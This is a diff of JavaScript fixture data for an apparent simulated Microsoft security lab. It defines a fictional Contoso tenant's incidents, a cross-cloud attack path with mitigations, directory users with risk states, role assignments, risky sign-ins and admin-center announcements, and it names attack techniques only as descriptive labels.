+    incidentId: 'dfc-inc-03',
+    entities: [
+      { type: 'EC2 instance', value: 'i-0b8d41f7c9a2e6f35' },
+      { type: 'Name tag',     value: 'prd-web-euw1-03' },
+      { type: 'Account',      value: 'ops-shared-admin' },
+      { type: 'IP address',  value: '198.51.100.72' },
+    ],
+    evidence: { 'Region': 'eu-west-1', 'VPC': 'vpc-0a19c4d7e2b6f8351', 'Connector': 'AWS account 111122223333', 'Failed attempts': '61 in 15 minutes', 'Successful sign-in': 'None observed' },
+    mitigation: [
+      'Rotate the key pair used by the instance and confirm no new public key was added.',
+      'Restrict management-port exposure on the instance to the approved jump path.',
+    ],
+    recommendations: [
+      'AWS instances should not expose management ports to the internet',
+      'Key pairs should be rotated on a defined schedule',
+    ]
   }
 ];
 
@@ -4154,14 +6061,35 @@ const MC_ATTACK_PATHS = [
     id: 'mc-path-1',
     cloud: 'AWS + GCP',
     severity: 'high',
+    status: 'Pending',
+    assetType: 'Cross-cloud identity',
+    firstSeen: '2026-06-28T12:04:00Z',
+    lastSeen: '2026-06-28T12:33:00Z',
+    affectedResources: 5,
     name: 'Shared admin path from AWS VM to GCP cluster',
-    start: 'nw-ops-vm-7',
+    start: 'i-0b8d41f7c9a2e6f35',
+    entryPoint: 'Public AWS management port',
+    target: 'gke-prod-01',
+    chokePoints: ['ops-shared-admin'],
     path: [
       'AWS connector sees a VM with broad CSPM and server coverage',
       'A reused operator account touches both the AWS host and the GCP project',
       'The GCP container cluster has an elevated workload identity and exposed control plane',
     ],
     result: 'Cross-cloud lateral movement could reach the container cluster and pivot into the database and storage tier.',
+    scenario: 'A reused operator identity connects an exposed AWS workload to a privileged GCP container environment.',
+    nodes: [
+      { id:'aws-vm', role:'entry', type:'AWS EC2 instance', label:'prd-web-euw1-03', subtitle:'Public management port · eu-west-1', insight:'The instance exposes a management service and has recent failed credential activity.', riskFactors:['Internet exposed','Management port open'], techniques:['T1133 External Remote Services'], recommendationIds:['ap-rec-aws-port'] },
+      { id:'shared-admin', role:'choke', type:'Cloud identity', label:'ops-shared-admin', subtitle:'Used in AWS and GCP', insight:'This shared operator account is the cross-cloud choke point and carries privileges in both environments.', riskFactors:['Credential reuse','Cross-cloud privilege'], techniques:['T1078 Valid Accounts'], recommendationIds:['ap-rec-shared-admin'] },
+      { id:'gke-cluster', role:'vulnerable', type:'GCP Kubernetes cluster', label:'gke-prod-01', subtitle:'Elevated workload identity', insight:'The cluster accepts the shared identity and a workload identity holds excessive permissions.', riskFactors:['Exposed control plane','Broad workload identity'], techniques:['T1613 Container and Resource Discovery'], recommendationIds:['ap-rec-gke-iam'] },
+      { id:'gcp-data', role:'target', type:'GCP data tier', label:'orders-prod', subtitle:'Database and storage services', insight:'The production data tier is reachable from the elevated cluster workload.', riskFactors:['Sensitive data','Production target'], techniques:['T1530 Data from Cloud Storage'], recommendationIds:['ap-rec-gcp-network'] },
+    ],
+    recommendations: [
+      { id:'ap-rec-aws-port', kind:'mitigating', title:'Restrict the AWS instance management port to the approved jump path', resource:'prd-web-euw1-03', status:'Not started' },
+      { id:'ap-rec-shared-admin', kind:'mitigating', title:'Replace ops-shared-admin with cloud-specific identities', resource:'ops-shared-admin', status:'Not started' },
+      { id:'ap-rec-gke-iam', kind:'mitigating', title:'Remove cluster-admin from the GCP workload identity', resource:'gke-prod-01', status:'Not started' },
+      { id:'ap-rec-gcp-network', kind:'additional', title:'Restrict the GCP data tier to private workload paths', resource:'orders-prod', status:'Not started' },
+    ],
   },
 ];
 
@@ -4182,7 +6110,7 @@ const DEFENDER_CLOUD_FIM = {
 };
 
 const DEFENDER_CLOUD_JIT = {
-  vm: 'nw-ops-vm-7',
+  vm: 'i-0b8d41f7c9a2e6f35',
   ports: ['3389', '22'],
   duration: '3 hours',
   requestState: 'Approved',
@@ -4615,3 +6543,329 @@ function getCopilotSettings() {
   return { ...COPILOT_SETTINGS_DEFAULTS, ...readStoredJson('defender-lab.copilot.settings', {}) };
 }
 // === end local-tasks fixtures ===
+
+// ===================== Entra admin center — tenant directory =====================
+// Populates #/entra/overview so the Entra surface carries the same synthetic
+// tenant the Defender/Sentinel views investigate. Every principal here either
+// appears in IDENTITIES (Defender for Identity onboarded) or in the alert /
+// incident fixtures, so cross-portal pivots line up.
+const ENTRA_TENANT = {
+  name:'Contoso Ltd',
+  domain:'contoso.com',
+  tenantId:'8f4a2c19-6b30-4d77-9a51-c2e8b4d70f13',
+  license:'Entra ID P2',
+  seatsUsed:24,
+  seatsTotal:50,
+  region:'North America',
+  syncStatus:'Healthy',
+  syncServer:'AAD-CONNECT-01.contoso.com',
+  lastSync:'2026-06-28T15:00:00Z',
+  secureScore:68,
+  secureScoreMax:100,
+};
+
+// Directory users. `xdrIdentity` links to an IDENTITIES row when the principal
+// is onboarded to Defender for Identity (drives the row click-through).
+const ENTRA_USERS = [
+  { upn:'jane.doe@contoso.com', displayName:'Jane Doe', jobTitle:'Senior Analyst', department:'Finance',
+    userType:'Member', enabled:true, source:'Windows Server AD (synced)', created:'2024-01-15T08:00:00Z',
+    lastSignIn:'2026-06-28T08:30:00Z', mfa:'Authenticator', sspr:true,
+    riskState:'At risk', riskLevel:'High', riskDetail:'Consent grant to DocViewer Pro after AiTM phish',
+    roles:[], licenses:['365 E5'], devices:3, groups:6,
+    xdrIdentity:'jane.doe@contoso.com', incidentId:'INC-1042' },
+  { upn:'maria.ross@contoso.com', displayName:'Maria Ross', jobTitle:'Account Executive', department:'Sales',
+    userType:'Member', enabled:true, source:'Windows Server AD (synced)', created:'2024-02-20T00:00:00Z',
+    lastSignIn:'2026-06-28T06:44:00Z', mfa:'SMS', sspr:true,
+    riskState:'Confirmed compromised', riskLevel:'High', riskDetail:'AiTM token replay from a second ASN',
+    roles:[], licenses:['365 E5'], devices:2, groups:4,
+    xdrIdentity:'maria.ross@contoso.com', incidentId:'INC-1051' },
+  { upn:'sam.lee@contoso.com', displayName:'Sam Lee', jobTitle:'Software Engineer', department:'Engineering',
+    userType:'Member', enabled:true, source:'Cloud only', created:'2024-04-10T00:00:00Z',
+    lastSignIn:'2026-06-28T13:33:00Z', mfa:'Authenticator', sspr:true,
+    riskState:'At risk', riskLevel:'High', riskDetail:'Unfamiliar properties + anonymous IP + impossible travel',
+    roles:[], licenses:['365 E5'], devices:2, groups:5,
+    xdrIdentity:'sam.lee@contoso.com', incidentId:'INC-1053' },
+  { upn:'liam.chen@contoso.com', displayName:'Liam Chen', jobTitle:'Field Technician', department:'IT Operations',
+    userType:'Member', enabled:true, source:'Windows Server AD (synced)', created:'2024-06-03T00:00:00Z',
+    lastSignIn:'2026-06-28T04:12:00Z', mfa:'Not registered', sspr:false,
+    riskState:'At risk', riskLevel:'Medium', riskDetail:'Password spray — 8 failed attempts from 203.0.113.74',
+    roles:[], licenses:['365 E3'], devices:1, groups:3,
+    xdrIdentity:null, incidentId:'INC-1053' },
+  { upn:'nina.patel@contoso.com', displayName:'Nina Patel', jobTitle:'Billing Specialist', department:'Finance',
+    userType:'Member', enabled:true, source:'Windows Server AD (synced)', created:'2024-03-11T00:00:00Z',
+    lastSignIn:'2026-06-28T07:55:00Z', mfa:'Authenticator', sspr:true,
+    riskState:'At risk', riskLevel:'Medium', riskDetail:'Suspicious inbox rule forwarding invoices externally',
+    roles:[], licenses:['365 E5'], devices:1, groups:4,
+    xdrIdentity:null, incidentId:'INC-1042' },
+  { upn:'evan.brooks@contoso.com', displayName:'Evan Brooks', jobTitle:'HR Generalist', department:'Human Resources',
+    userType:'Member', enabled:true, source:'Cloud only', created:'2025-01-22T00:00:00Z',
+    lastSignIn:'2026-06-27T16:20:00Z', mfa:'Authenticator', sspr:true,
+    riskState:'Remediated', riskLevel:'Low', riskDetail:'Clicked payroll-calendar phish; password reset completed',
+    roles:[], licenses:['365 E3'], devices:1, groups:3,
+    xdrIdentity:null, incidentId:null },
+  { upn:'olivia.kim@contoso.com', displayName:'Olivia Kim', jobTitle:'Security Operations Lead', department:'Security Operations',
+    userType:'Member', enabled:true, source:'Cloud only', created:'2023-10-05T00:00:00Z',
+    lastSignIn:'2026-06-28T14:40:00Z', mfa:'Passkey (FIDO2)', sspr:true,
+    riskState:'None', riskLevel:'None', riskDetail:'PIM activation of Security Administrator (CHG-4821, approved)',
+    roles:['Security Administrator (PIM eligible)'], licenses:['365 E5'], devices:2, groups:8,
+    xdrIdentity:null, incidentId:null },
+  { upn:'alex.wong@contoso.com', displayName:'Alex Wong', jobTitle:'Travel Coordinator', department:'Operations',
+    userType:'Member', enabled:true, source:'Cloud only', created:'2025-03-14T00:00:00Z',
+    lastSignIn:'2026-06-28T09:05:00Z', mfa:'SMS', sspr:true,
+    riskState:'At risk', riskLevel:'Low', riskDetail:'Consented to the Contoso Travel enterprise app (verified publisher)',
+    roles:[], licenses:['365 E3'], devices:1, groups:2,
+    xdrIdentity:null, incidentId:null },
+  { upn:'jdoe@contoso.com', displayName:'jdoe (local)', jobTitle:'Workstation user (WKS-03)', department:'Sales',
+    userType:'Member', enabled:true, source:'Windows Server AD (synced)', created:'2025-11-08T12:14:00Z',
+    lastSignIn:'2026-06-28T15:00:00Z', mfa:'Not registered', sspr:false,
+    riskState:'At risk', riskLevel:'Medium', riskDetail:'Failed-then-success local interactive logons on WKS-03',
+    roles:[], licenses:['365 E3'], devices:1, groups:2,
+    xdrIdentity:'jdoe@contoso.com', incidentId:'INC-1038' },
+  { upn:'dpatel@contoso.com', displayName:'Dev Patel', jobTitle:'Platform Engineer', department:'Engineering',
+    userType:'Member', enabled:true, source:'Windows Server AD (synced)', created:'2024-05-19T00:00:00Z',
+    lastSignIn:'2026-06-28T11:02:00Z', mfa:'Passkey (FIDO2)', sspr:true,
+    riskState:'None', riskLevel:'None', riskDetail:'',
+    roles:[], licenses:['365 E5'], devices:2, groups:5,
+    xdrIdentity:null, incidentId:null },
+  { upn:'mfoster@contoso.com', displayName:'Morgan Foster', jobTitle:'Manufacturing Supervisor', department:'Operations',
+    userType:'Member', enabled:true, source:'Windows Server AD (synced)', created:'2023-11-30T00:00:00Z',
+    lastSignIn:'2026-06-28T05:48:00Z', mfa:'Not registered', sspr:false,
+    riskState:'None', riskLevel:'None', riskDetail:'Legacy Win10 endpoints; MFA registration outstanding',
+    roles:[], licenses:['365 E3'], devices:2, groups:3,
+    xdrIdentity:null, incidentId:null },
+  { upn:'olivia.martin@contoso.com', displayName:'Olivia Martin', jobTitle:'Regional Sales Manager', department:'Sales',
+    userType:'Member', enabled:true, source:'Cloud only', created:'2024-08-02T00:00:00Z',
+    lastSignIn:'2026-06-28T10:11:00Z', mfa:'Authenticator', sspr:true,
+    riskState:'None', riskLevel:'None', riskDetail:'Insider risk case IR-2044 — departing employee policy',
+    roles:[], licenses:['365 E5'], devices:1, groups:4,
+    xdrIdentity:null, incidentId:null },
+  { upn:'m.okafor@contoso.com', displayName:'Michael Okafor', jobTitle:'Threat Analyst', department:'Security Operations',
+    userType:'Member', enabled:true, source:'Cloud only', created:'2024-12-01T00:00:00Z',
+    lastSignIn:'2026-06-28T13:50:00Z', mfa:'Passkey (FIDO2)', sspr:true,
+    riskState:'None', riskLevel:'None', riskDetail:'',
+    roles:['Security Reader'], licenses:['365 E5','Security Copilot'], devices:1, groups:6,
+    xdrIdentity:null, incidentId:null },
+  { upn:'r.vance@contoso.com', displayName:'Rachel Vance', jobTitle:'SOC Manager', department:'Security Operations',
+    userType:'Member', enabled:true, source:'Cloud only', created:'2023-09-18T00:00:00Z',
+    lastSignIn:'2026-06-28T12:35:00Z', mfa:'Passkey (FIDO2)', sspr:true,
+    riskState:'None', riskLevel:'None', riskDetail:'',
+    roles:['Security Operator','Security Administrator (PIM eligible)'], licenses:['365 E5','Security Copilot'], devices:2, groups:9,
+    xdrIdentity:null, incidentId:null },
+  { upn:'tchen@contoso.com', displayName:'Tara Chen', jobTitle:'Corporate Counsel', department:'Legal',
+    userType:'Member', enabled:true, source:'Cloud only', created:'2024-07-07T00:00:00Z',
+    lastSignIn:'2026-06-27T18:02:00Z', mfa:'Authenticator', sspr:true,
+    riskState:'None', riskLevel:'None', riskDetail:'eDiscovery reviewer on CASE-2406-1042',
+    roles:['eDiscovery Manager'], licenses:['365 E5'], devices:1, groups:3,
+    xdrIdentity:null, incidentId:null },
+  { upn:'mrivera@contoso.com', displayName:'Marco Rivera', jobTitle:'Marketing Manager', department:'Marketing',
+    userType:'Member', enabled:true, source:'Cloud only', created:'2025-02-11T00:00:00Z',
+    lastSignIn:'2026-06-28T09:41:00Z', mfa:'Authenticator', sspr:true,
+    riskState:'None', riskLevel:'None', riskDetail:'',
+    roles:[], licenses:['365 E3'], devices:1, groups:2,
+    xdrIdentity:null, incidentId:null },
+  { upn:'j.reyes@contoso.com', displayName:'Jordan Reyes', jobTitle:'Controller', department:'Finance',
+    userType:'Member', enabled:true, source:'Windows Server AD (synced)', created:'2023-12-04T00:00:00Z',
+    lastSignIn:'2026-06-28T08:12:00Z', mfa:'Authenticator', sspr:true,
+    riskState:'None', riskLevel:'None', riskDetail:'Owner of the Finance file share on FIN-FS-02',
+    roles:[], licenses:['365 E5'], devices:1, groups:5,
+    xdrIdentity:null, incidentId:null },
+  { upn:'lee.helpdesk@contoso.com', displayName:'Helpdesk (Lee)', jobTitle:'Service Desk Technician', department:'IT Operations',
+    userType:'Member', enabled:true, source:'Windows Server AD (synced)', created:'2024-10-21T00:00:00Z',
+    lastSignIn:'2026-06-28T07:30:00Z', mfa:'Authenticator', sspr:true,
+    riskState:'None', riskLevel:'None', riskDetail:'',
+    roles:['Helpdesk Administrator'], licenses:['365 E3'], devices:1, groups:4,
+    xdrIdentity:null, incidentId:null },
+  { upn:'admin.tier0@contoso.com', displayName:'Tier-0 Admin', jobTitle:'Enterprise Administrator', department:'IT Operations',
+    userType:'Member', enabled:true, source:'Cloud only', created:'2023-08-01T00:00:00Z',
+    lastSignIn:'2026-06-28T14:05:00Z', mfa:'Passkey (FIDO2)', sspr:true,
+    riskState:'None', riskLevel:'None', riskDetail:'Break-glass-adjacent admin; excluded from risk-based CA by design',
+    roles:['Global Administrator'], licenses:['365 E5'], devices:1, groups:7,
+    xdrIdentity:null, incidentId:null },
+  { upn:'cloudadmin@contoso.com', displayName:'Cloud Admin', jobTitle:'Cloud Platform Administrator', department:'IT Operations',
+    userType:'Member', enabled:true, source:'Cloud only', created:'2023-08-01T00:00:00Z',
+    lastSignIn:'2026-06-28T11:47:00Z', mfa:'Authenticator', sspr:true,
+    riskState:'None', riskLevel:'None', riskDetail:'',
+    roles:['Global Administrator'], licenses:['365 E5'], devices:1, groups:6,
+    xdrIdentity:null, incidentId:null },
+  { upn:'svc-backup@contoso.com', displayName:'svc-backup', jobTitle:'Backup service account', department:'IT Operations',
+    userType:'Service principal', enabled:false, source:'Windows Server AD (synced)', created:'2023-09-12T00:00:00Z',
+    lastSignIn:'2026-06-28T03:44:00Z', mfa:'Not registered', sspr:false,
+    riskState:'Confirmed compromised', riskLevel:'High', riskDetail:'AdminSDHolder DACL write + DCSync from 10.20.4.55 — account disabled',
+    roles:['Backup Operators (on-prem)'], licenses:[], devices:2, groups:3,
+    xdrIdentity:'svc-backup@contoso.com', incidentId:'INC-1019' },
+  { upn:'fin-svc@contoso.com', displayName:'fin-svc', jobTitle:'Finance file-server service account', department:'Finance',
+    userType:'Service principal', enabled:true, source:'Windows Server AD (synced)', created:'2024-09-01T00:00:00Z',
+    lastSignIn:'2026-06-28T10:20:00Z', mfa:'Not registered', sspr:false,
+    riskState:'At risk', riskLevel:'High', riskDetail:'Launched locker.exe and vssadmin shadow-copy deletion on FIN-FS-02',
+    roles:['Finance Share Owners'], licenses:[], devices:2, groups:2,
+    xdrIdentity:'fin-svc@contoso.com', incidentId:'INC-1050' },
+  { upn:'MSOL_AzureSync@contoso.com', displayName:'MSOL_AzureSync', jobTitle:'Directory synchronization (Entra Connect)', department:'Entra Connect',
+    userType:'Service principal', enabled:true, source:'Windows Server AD (synced)', created:'2023-08-01T00:00:00Z',
+    lastSignIn:'2026-06-28T15:00:00Z', mfa:'Not registered', sspr:false,
+    riskState:'Dismissed', riskLevel:'Informational', riskDetail:'DCSync from AAD-CONNECT-01 is expected — benign true positive',
+    roles:['Directory Synchronization Accounts'], licenses:[], devices:1, groups:1,
+    xdrIdentity:'MSOL_AzureSync@contoso.com', incidentId:'INC-1019' },
+  { upn:'svc-scan@contoso.com', displayName:'svc-scan', jobTitle:'Vulnerability scanner service account', department:'Security Operations',
+    userType:'Service principal', enabled:true, source:'Windows Server AD (synced)', created:'2024-02-02T00:00:00Z',
+    lastSignIn:'2026-06-28T09:00:00Z', mfa:'Not registered', sspr:false,
+    riskState:'None', riskLevel:'Informational', riskDetail:'Runs scanner.exe on WKS-01/02 — source of the suppression-rule lab',
+    roles:[], licenses:[], devices:3, groups:1,
+    xdrIdentity:null, incidentId:null },
+  { upn:'legacy.batch@contoso.com', displayName:'legacy-batch', jobTitle:'Nightly batch job', department:'Finance',
+    userType:'Service principal', enabled:true, source:'Windows Server AD (synced)', created:'2023-08-15T00:00:00Z',
+    lastSignIn:'2026-06-28T02:00:00Z', mfa:'Not registered', sspr:false,
+    riskState:'At risk', riskLevel:'Medium', riskDetail:'Still authenticating with legacy protocols — blocked by CA002',
+    roles:[], licenses:[], devices:1, groups:1,
+    xdrIdentity:null, incidentId:null },
+  { upn:'krbtgt@contoso.com', displayName:'krbtgt', jobTitle:'KDC service account', department:'Active Directory',
+    userType:'Service principal', enabled:false, source:'Windows Server AD (not synced)', created:'2023-08-01T00:00:00Z',
+    lastSignIn:'2026-06-25T00:00:00Z', mfa:'Not registered', sspr:false,
+    riskState:'None', riskLevel:'Informational', riskDetail:'Tier-0 KDC account — watched for Golden Ticket / password rotation',
+    roles:[], licenses:[], devices:0, groups:1,
+    xdrIdentity:'krbtgt@contoso.com', incidentId:'INC-1019' },
+  { upn:'partner.auditor@fabrikam.com', displayName:'Priya Raman (Fabrikam)', jobTitle:'External auditor', department:'—',
+    userType:'Guest', enabled:true, source:'B2B invitation', created:'2026-05-04T00:00:00Z',
+    lastSignIn:'2026-06-26T14:20:00Z', mfa:'Authenticator', sspr:false,
+    riskState:'None', riskLevel:'None', riskDetail:'Guest scoped to the Finance audit SharePoint site',
+    roles:[], licenses:[], devices:0, groups:1,
+    xdrIdentity:null, incidentId:null },
+  { upn:'svc-partner@contoso.com', displayName:'svc-partner', jobTitle:'Partner data feed', department:'Sales',
+    userType:'Service principal', enabled:true, source:'Cloud only', created:'2025-06-10T00:00:00Z',
+    lastSignIn:'2026-06-28T06:00:00Z', mfa:'Not registered', sspr:false,
+    riskState:'None', riskLevel:'None', riskDetail:'Certificate credential expires 2026-09-01',
+    roles:[], licenses:[], devices:0, groups:1,
+    xdrIdentity:null, incidentId:null },
+];
+
+// Privileged role assignments surfaced on the Entra overview (PIM view).
+const ENTRA_ROLE_ASSIGNMENTS = [
+  { role:'Global Administrator',        active:2, eligible:0, members:['admin.tier0@contoso.com','cloudadmin@contoso.com'],
+    note:'Two permanent assignments — Product guidance recommends 2–4 with phishing-resistant MFA.' },
+  { role:'Security Administrator',      active:0, eligible:2, members:['olivia.kim@contoso.com','r.vance@contoso.com'],
+    note:'PIM eligible only. Olivia Kim activated for 45 minutes under CHG-4821.' },
+  { role:'Security Operator',           active:1, eligible:0, members:['r.vance@contoso.com'],
+    note:'Standing assignment used for Defender XDR response actions.' },
+  { role:'Security Reader',             active:1, eligible:0, members:['m.okafor@contoso.com'],
+    note:'Read-only analyst access across Defender and Sentinel.' },
+  { role:'Helpdesk Administrator',      active:1, eligible:0, members:['lee.helpdesk@contoso.com'],
+    note:'Can reset passwords for non-admin users — a common attacker target.' },
+  { role:'eDiscovery Manager',          active:1, eligible:0, members:['tchen@contoso.com'],
+    note:'Purview eDiscovery (Premium) case owner.' },
+  { role:'Directory Synchronization Accounts', active:1, eligible:0, members:['MSOL_AzureSync@contoso.com'],
+    note:'Service role. Replication is expected — do not treat its DCSync as malicious.' },
+];
+
+// Risk detections aggregated for the last 7 days (Entra ID Protection).
+const ENTRA_RISK_DETECTION_SUMMARY = [
+  { type:'Unfamiliar sign-in properties', count:14, level:'High',   trend:'+6' },
+  { type:'Anonymous IP address',          count:9,  level:'Medium', trend:'+4' },
+  { type:'Impossible travel',             count:6,  level:'Medium', trend:'+2' },
+  { type:'Adversary-in-the-middle',       count:3,  level:'High',   trend:'+3' },
+  { type:'Password spray',                count:3,  level:'Medium', trend:'+1' },
+  { type:'Leaked credentials',            count:2,  level:'High',   trend:'0' },
+  { type:'Malicious IP address',          count:2,  level:'Medium', trend:'-1' },
+  { type:'Token replay',                  count:1,  level:'High',   trend:'+1' },
+];
+
+// Recent risky sign-ins across the tenant (feeds the overview activity card).
+const ENTRA_RECENT_SIGNINS = [
+  { time:'2026-06-28T13:33:00Z', user:'sam.lee@contoso.com',    app:'Azure Portal',                 ip:'91.219.236.54',  location:'Amsterdam, NL', result:'Blocked by CA', risk:'High',   ca:'CA003 - Risky sign-in MFA' },
+  { time:'2026-06-28T13:27:00Z', user:'sam.lee@contoso.com',    app:'Exchange Online',              ip:'91.219.236.54',  location:'Amsterdam, NL', result:'Success',       risk:'High',   ca:'Not applied' },
+  { time:'2026-06-28T10:20:00Z', user:'fin-svc@contoso.com',    app:'Windows SMB (on-prem)',        ip:'10.20.4.55',     location:'Redmond, US',   result:'Success',       risk:'High',   ca:'Not applied' },
+  { time:'2026-06-28T09:05:00Z', user:'alex.wong@contoso.com',  app:'Contoso Travel',               ip:'76.21.55.4',     location:'Seattle, US',   result:'Success',       risk:'Low',    ca:'CA001 satisfied' },
+  { time:'2026-06-28T08:30:00Z', user:'jane.doe@contoso.com',   app:'DocViewer Pro',                ip:'185.199.111.12', location:'Ashburn, US',   result:'Success',       risk:'High',   ca:'Not applied' },
+  { time:'2026-06-28T06:44:00Z', user:'maria.ross@contoso.com', app:'SharePoint Online',            ip:'185.199.111.12', location:'Ashburn, US',   result:'Interrupted',   risk:'High',   ca:'CA003 - Risky sign-in MFA' },
+  { time:'2026-06-28T04:12:00Z', user:'liam.chen@contoso.com',  app:'365 portal',         ip:'203.0.113.74',   location:'Unknown',       result:'Failure',       risk:'Medium', ca:'Not applied' },
+  { time:'2026-06-28T03:44:00Z', user:'svc-backup@contoso.com', app:'Windows LDAP (on-prem)',       ip:'10.20.4.55',     location:'Redmond, US',   result:'Success',       risk:'High',   ca:'Not applied' },
+  { time:'2026-06-28T02:00:00Z', user:'legacy.batch@contoso.com', app:'IMAP4 (legacy auth)',        ip:'10.20.9.10',     location:'Redmond, US',   result:'Blocked by CA', risk:'Medium', ca:'CA002 - Block legacy auth' },
+];
+
+// Tenant posture recommendations shown alongside the identity secure score.
+const ENTRA_RECOMMENDATIONS = [
+  { title:'Require phishing-resistant MFA for privileged roles', impact:'High',   status:'Not started',
+    detail:'2 Global Administrators hold standing assignments; only one uses a passkey.' },
+  { title:'Register all users for MFA and SSPR',                 impact:'High',   status:'In progress',
+    detail:'3 members are unregistered (liam.chen, mfoster, jdoe) — risk policies cannot self-remediate them.' },
+  { title:'Enable a sign-in risk-based Conditional Access policy', impact:'High', status:'Not started',
+    detail:'Build CA003 in the Conditional Access lab so High sign-in risk prompts MFA instead of going unchallenged.' },
+  { title:'Move standing admin roles to PIM eligible',           impact:'Medium', status:'In progress',
+    detail:'Security Administrator is already eligible-only; Global Administrator is not.' },
+  { title:'Review service principals with stale credentials',    impact:'Medium', status:'Not started',
+    detail:'svc-partner certificate expires 2026-09-01; legacy-batch still uses legacy protocols.' },
+];
+// === end Entra tenant directory ===
+
+// ===================== 365 admin center =====================
+// Supporting tenant-administration fixtures. These reuse ENTRA_USERS for the
+// directory itself so identity, licensing, Defender, and Purview pivots all
+// refer to the same fictional Contoso principals.
+const M365_ADMIN_TENANT = {
+  name:'Contoso Ltd', domain:'contoso.com', view:'Dashboard view',
+  release:'Standard release', region:'North America',
+};
+
+const M365_LICENSE_PRODUCTS = [
+  { product:'365 E5', purchased:30, assigned:13, status:'Active', renewal:'2027-01-01' },
+  { product:'365 E3', purchased:20, assigned:7,  status:'Active', renewal:'2027-01-01' },
+  { product:'Security Copilot', purchased:6, assigned:2,   status:'Active', renewal:'2026-12-01' },
+];
+
+const M365_USAGE_REPORTS = [
+  { product:'Teams', enabled:20, active:18, period:'Last 30 days' },
+  { product:'Exchange Online', enabled:20, active:19, period:'Last 30 days' },
+  { product:'SharePoint',      enabled:20, active:16, period:'Last 30 days' },
+  { product:'OneDrive',        enabled:20, active:17, period:'Last 30 days' },
+  { product:'365 Apps', enabled:20, active:19, period:'Last 30 days' },
+];
+
+const M365_SERVICE_HEALTH = [
+  { service:'Exchange Online', status:'Healthy', detail:'No active issues', updated:'2026-08-02T18:45:00Z' },
+  { service:'Teams', status:'Healthy', detail:'No active issues', updated:'2026-08-02T18:44:00Z' },
+  { service:'SharePoint Online', status:'Advisory', detail:'Some users may see delayed search indexing', updated:'2026-08-02T18:37:00Z' },
+  { service:'Entra ID', status:'Healthy', detail:'No active issues', updated:'2026-08-02T18:42:00Z' },
+  { service:'Purview', status:'Healthy', detail:'No active issues', updated:'2026-08-02T18:40:00Z' },
+];
+
+const M365_MESSAGE_CENTER = [
+  {
+    id:'MC1084211', title:'Review authentication method registration', service:'Entra',
+    impact:'Action required', tag:'Admin impact', category:'Prevent or fix issues', relevance:'High',
+    published:'2026-07-31', updated:'2026-08-01', timing:'August 2026', due:'2026-08-15',
+    platform:'Web', orgStatus:'Action recommended', monthlyUsers:20,
+    whatWhy:'Contoso should review users who have not registered a strong authentication method before the next registration campaign.',
+    rollout:'The tenant review is available now. The fictional campaign begins August 18 and is evaluated in phases through August 29.',
+    orgImpact:'Three active members in the lab directory have no registered MFA method. They can be prompted during sign-in and might contact the help desk.',
+    actions:['Review the unregistered-user list in Entra.', 'Notify the help desk about the registration prompt.', 'Confirm break-glass accounts are excluded from the campaign.'],
+    compliance:'No new tenant data location is introduced. Authentication registration records remain governed by existing identity access and audit controls.',
+  },
+  {
+    id:'MC1083904', title:'New usage report export fields', service:'365 admin center',
+    impact:'Plan for change', tag:'Feature update', category:'Plan for change', relevance:'Medium',
+    published:'2026-07-30', updated:'2026-07-30', timing:'Late August 2026', due:'2026-08-28',
+    platform:'Web and CSV export', orgStatus:'Planned', monthlyUsers:4,
+    whatWhy:'Usage report exports will include additional activity and reporting-period fields so administrators can interpret exported totals without a separate lookup.',
+    rollout:'Targeted release starts August 20. Standard release is planned to complete by September 4.',
+    orgImpact:'Existing export automation that assumes a fixed column order could fail when the new fields appear. The on-screen reports are unchanged.',
+    actions:['Review scripts that parse usage-report CSV files.', 'Prefer column names instead of numeric column positions.', 'Tell report owners when the revised schema reaches the tenant.'],
+    compliance:'Exports can contain usage metadata. Continue storing exported files in an access-controlled location and apply the organization retention policy.',
+  },
+  {
+    id:'MC1082710', title:'SharePoint search experience update', service:'SharePoint Online',
+    impact:'Stay informed', tag:'Major update', category:'Plan for change', relevance:'Medium',
+    published:'2026-07-28', updated:'2026-08-01', timing:'September 2026', due:'2026-09-04',
+    platform:'Web', orgStatus:'Scheduled', monthlyUsers:16,
+    whatWhy:'The SharePoint search results experience is being refreshed to make filters and result context easier to use.',
+    rollout:'Targeted release begins September 7. Standard release follows in phases and is expected to finish September 25.',
+    orgImpact:'Users will see updated result controls and might need revised help-desk guidance. Search permissions and indexed content are not changed by this lab announcement.',
+    actions:['Brief support staff on the visual change.', 'Update internal search screenshots after rollout.', 'Validate common search journeys with the pilot group.'],
+    compliance:'The change does not alter configured permissions, retention, eDiscovery, or DLP behavior in this fictional scenario.',
+  },
+];
+
+const M365_SETUP_TASKS = [
+  { title:'Protect admin accounts with phishing-resistant MFA', category:'Sign-in security', status:'In progress', route:'#/entra/conditional-access' },
+  { title:'Review data loss prevention coverage', category:'Data protection', status:'Available', route:'#/purview/dlp' },
+  { title:'Review service health notification preferences', category:'Operations', status:'Available', route:'#/m365-admin/service-health' },
+  { title:'Validate 365 license assignments', category:'Licensing', status:'Available', route:'#/m365-admin/licenses' },
+];
+// === end 365 admin center ===
